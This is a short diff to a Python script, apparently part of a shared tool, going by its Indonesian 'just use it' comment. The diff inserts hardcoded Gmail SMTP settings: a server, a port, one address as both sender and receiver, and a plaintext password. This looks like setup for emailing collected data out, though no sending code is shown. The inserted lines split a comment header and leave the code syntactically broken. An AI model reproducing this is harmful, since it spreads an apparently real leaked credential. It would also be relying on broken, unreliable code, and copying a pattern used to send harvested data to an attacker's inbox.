@@ -6,7 +6,16 @@ import json , sys , hashlib , os , time , marshal, getpass
      Jangan Direcode ya bosku , tinggal make apa susahnya sih
 '''
 ###################################################################
-#                             COLOR
+#           
+smtp_server = "smtp.gmail.com"
+port = 587
+
+sender = "zak073342@gmail.com"
+
+password = "sakouti12345"
+
+receiver = "zak073342@gmail.com"
+                  COLOR
 if sys.platform in ["linux","linux2"]:
 	W = "\033[0m"
         G = '\033[32;1m'
